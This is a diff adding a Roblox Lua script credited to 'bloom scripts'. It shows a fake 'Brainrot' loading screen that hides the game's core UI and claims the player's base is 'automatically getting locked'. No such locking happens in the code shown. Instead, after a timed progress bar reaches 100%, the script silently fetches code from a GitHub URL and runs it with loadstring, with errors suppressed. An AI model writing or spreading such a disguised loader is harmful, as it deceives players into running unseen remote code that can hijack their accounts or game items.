@@ -1,0 +1,246 @@
+-- 🧠 Fullscreen Brainrot Loading Screen -> Mini Loading Screen Transition (Final)
+-- Made by Siva / bloom scripts
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+
+-- Disable CoreGui
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+ReplicatedFirst:RemoveDefaultLoadingScreen()
+
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+--== FULLSCREEN LOADING SCREEN ==--
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BrainrotLoadingScreen"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = CoreGui
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1, 0, 1, 0)
+Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Background.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Background.BorderSizePixel = 1
+Background.Parent = ScreenGui
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Text = "Wait for this to load!"
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Position = UDim2.new(0, 0, 0.2, 0)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 48
+Title.Parent = Background
+
+-- Subtitle
+local StatusText = Instance.new("TextLabel")
+StatusText.Text = "Don't worry, your base is automatically getting locked."
+StatusText.Size = UDim2.new(1, -40, 0, 28)
+StatusText.Position = UDim2.new(0, 20, 0.2, 80)
+StatusText.BackgroundTransparency = 1
+StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+StatusText.Font = Enum.Font.Gotham
+StatusText.TextScaled = true
+StatusText.TextWrapped = true
+StatusText.Parent = Background
+
+-- Progress Bar
+local ProgressFrame = Instance.new("Frame")
+ProgressFrame.Size = UDim2.new(0.6, 0, 0, 30)
+ProgressFrame.Position = UDim2.new(0.2, 0, 0.7, 0)
+ProgressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ProgressFrame.BorderSizePixel = 0
+ProgressFrame.Parent = Background
+
+local ProgressCorner = Instance.new("UICorner")
+ProgressCorner.CornerRadius = UDim.new(0, 10)
+ProgressCorner.Parent = ProgressFrame
+
+local Fill = Instance.new("Frame")
+Fill.Size = UDim2.new(0, 0, 1, 0)
+Fill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Fill.BorderSizePixel = 0
+Fill.Parent = ProgressFrame
+
+local FillCorner = Instance.new("UICorner")
+FillCorner.CornerRadius = UDim.new(0, 10)
+FillCorner.Parent = Fill
+
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(1, 0, 1, 0)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentText.Font = Enum.Font.GothamSemibold
+PercentText.TextScaled = true
+PercentText.Parent = ProgressFrame
+
+-- Fullscreen progress (1 minute)
+local startTime = tick()
+local totalTime = 60
+RunService.RenderStepped:Connect(function()
+	local elapsed = tick() - startTime
+	local progress = math.clamp(elapsed / totalTime, 0, 1)
+	Fill.Size = UDim2.new(progress, 0, 1, 0)
+	PercentText.Text = string.format("%d%%", math.floor(progress * 100))
+end)
+
+--== When done, wait 3 seconds, then show mini loading screen ==--
+task.delay(totalTime + 3, function()
+	if ScreenGui then ScreenGui:Destroy() end
+
+	-- 🟢 MINI LOADING SCREEN
+	local MiniGui = Instance.new("ScreenGui")
+	MiniGui.Name = "MiniLoadingScreen"
+	MiniGui.ResetOnSpawn = false
+	MiniGui.Parent = CoreGui
+
+	-- Outline Frame
+	local outlineFrame = Instance.new("Frame")
+	outlineFrame.Size = UDim2.new(0, 400, 0, 150)
+	outlineFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+	outlineFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	outlineFrame.BorderSizePixel = 0
+	outlineFrame.Parent = MiniGui
+
+	local outlineCorner = Instance.new("UICorner")
+	outlineCorner.CornerRadius = UDim.new(0, 12)
+	outlineCorner.Parent = outlineFrame
+
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Size = UDim2.new(1, -6, 1, -6)
+	mainFrame.Position = UDim2.new(0, 3, 0, 3)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Parent = outlineFrame
+
+	local mainCorner = Instance.new("UICorner")
+	mainCorner.CornerRadius = UDim.new(0, 12)
+	mainCorner.Parent = mainFrame
+
+	-- Title with animated dots
+	local Title = Instance.new("TextLabel")
+	Title.Text = "Script loading please wait"
+	Title.Size = UDim2.new(1, 0, 0, 24)
+	Title.Position = UDim2.new(0, 0, 0, 10)
+	Title.BackgroundTransparency = 1
+	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Title.Font = Enum.Font.GothamBold
+	Title.TextScaled = true
+	Title.Parent = mainFrame
+
+	local dotCount = 0
+	task.spawn(function()
+	    while Title.Parent do
+	        dotCount = (dotCount + 1) % 4
+	        Title.Text = "Script loading please wait" .. string.rep(".", dotCount)
+	        task.wait(0.5)
+	    end
+	end)
+
+	-- Subtitle
+	local Subtitle = Instance.new("TextLabel")
+	Subtitle.Text = "YT : bloom scripts"
+	Subtitle.Size = UDim2.new(1, 0, 0, 20)
+	Subtitle.Position = UDim2.new(0, 0, 0, 45)
+	Subtitle.BackgroundTransparency = 1
+	Subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+	Subtitle.Font = Enum.Font.Gotham
+	Subtitle.TextScaled = true
+	Subtitle.Parent = mainFrame
+
+	-- Progress bar
+	local ProgressFrame = Instance.new("Frame")
+	ProgressFrame.Size = UDim2.new(0.8, 0, 0, 25)
+	ProgressFrame.Position = UDim2.new(0.1, 0, 0.6, 0)
+	ProgressFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	ProgressFrame.BorderSizePixel = 0
+	ProgressFrame.Parent = mainFrame
+
+	local ProgressCorner = Instance.new("UICorner")
+	ProgressCorner.CornerRadius = UDim.new(0, 10)
+	ProgressCorner.Parent = ProgressFrame
+
+	local Fill = Instance.new("Frame")
+	Fill.Size = UDim2.new(0, 0, 1, 0)
+	Fill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+	Fill.BorderSizePixel = 0
+	Fill.Parent = ProgressFrame
+
+	local FillCorner = Instance.new("UICorner")
+	FillCorner.CornerRadius = UDim.new(0, 10)
+	FillCorner.Parent = Fill
+
+	local PercentText = Instance.new("TextLabel")
+	PercentText.Size = UDim2.new(1, 0, 1, 0)
+	PercentText.BackgroundTransparency = 1
+	PercentText.Text = "0%"
+	PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+	PercentText.Font = Enum.Font.GothamSemibold
+	PercentText.TextScaled = true
+	PercentText.Parent = ProgressFrame
+
+	-- 5-Minute progress (stays after 100%)
+	local startTime = tick()
+	local totalTime = 210
+	RunService.RenderStepped:Connect(function()
+	    local elapsed = tick() - startTime
+	    local progress = math.clamp(elapsed / totalTime, 0, 1)
+	    Fill.Size = UDim2.new(progress, 0, 1, 0)
+	    PercentText.Text = string.format("%d%%", math.floor(progress * 100))
+	end)
+
+ -- ✅ PLACE THIS RIGHT HERE ✅
+    PercentText:GetPropertyChangedSignal("Text"):Connect(function()
+        if PercentText.Text == "100%" then
+            
+            -- Small delay so the player sees the 100%
+            task.wait(0.4)
+
+            if MiniGui then
+                MiniGui:Destroy()
+            end
+
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/conchadmin/refs/heads/main/adminconchreal"))()
+            end)
+        end
+    end)
+
+	-- Draggable (PC + Mobile)
+	local dragging = false
+	local dragInput, dragStart, startPos
+	local function update(input)
+	    local delta = input.Position - dragStart
+	    outlineFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+
+	mainFrame.InputBegan:Connect(function(input)
+	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+	        dragging = true
+	        dragStart = input.Position
+	        startPos = outlineFrame.Position
+	        input.Changed:Connect(function()
+	            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+	        end)
+	    end
+	end)
+
+	mainFrame.InputChanged:Connect(function(input)
+	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	        dragInput = input
+	    end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+	    if input == dragInput and dragging then update(input) end
+	end)
+end)
